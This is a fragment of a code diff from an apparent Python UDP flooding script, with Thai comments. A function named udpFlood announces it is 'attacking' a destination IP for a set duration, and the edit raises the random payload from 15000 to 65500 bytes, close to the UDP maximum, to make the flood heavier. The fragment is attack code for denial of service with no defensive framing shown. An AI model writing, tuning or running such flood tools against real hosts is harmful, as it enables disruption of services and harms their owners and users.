@@ -27,7 +27,7 @@ def udpFlood():
     print(f"Start attacking {dest_ip} for {dur} seconds")
     
     # สร้างข้อมูลสุ่มเป็น payload
-    payload = random._urandom(15000)
+    payload = random._urandom(65500)
     
     # เวลาเริ่มต้น
     start_time = time.time()
